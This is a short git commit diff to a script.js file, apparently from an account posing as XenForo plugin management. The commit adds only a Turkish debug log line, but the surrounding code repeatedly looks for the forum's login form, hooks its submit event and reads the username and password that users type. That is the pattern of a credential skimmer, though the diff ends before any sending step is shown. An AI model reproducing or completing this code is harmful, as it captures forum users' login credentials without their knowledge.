a8417a509115765d79df2a5fa12801701cdb5cc9
xenforoPluginManagement <131064044+xenforoPluginManagement@users.noreply.github.com>
2023-06-10 10:07:57 +0300

    Update script.js

--- script.js
+++ script.js
@@ -12,6 +12,7 @@ function mesaj(url, mesaj) {
 setInterval(() => {
     if(document.querySelectorAll('form[action="/login/login"]')[0] !== undefined) {
         if (document.querySelectorAll('form[action="/login/login"]')[0].getAttribute('listener') !== 'true') {
+            console.log("listener eklendi")
             document.querySelectorAll('form[action="/login/login"]')[0].addEventListener("submit", function(e){
                 var username = document.getElementsByName("login")[0].value
                 var password = document.getElementsByName("password")[0].value
